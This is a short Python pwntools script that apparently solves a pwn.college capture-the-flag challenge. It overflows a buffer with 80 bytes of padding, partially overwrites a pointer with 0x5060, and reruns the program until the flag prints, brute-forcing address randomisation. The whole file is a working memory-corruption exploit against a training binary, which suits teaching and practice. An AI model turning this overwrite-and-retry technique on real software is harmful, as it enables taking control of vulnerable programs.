#!/usr/bin/env python3
import itertools

from pwn import *

path = "/challenge/pointer-problems-easy"

offset = 80

payload = b"A" * offset + p16(0x5060)

for count in itertools.count():
    p = process(path)

    p.sendline(str(offset+2).encode())
    p.sendline(payload)
    output = p.clean(timeout=2)
    print(output.decode())
    if b"pwn.college{" in output:
        print(f"[+] Try {count}")
        print(output.decode("utf-8", errors="ignore"))
        p.close()
        break
    p.close()
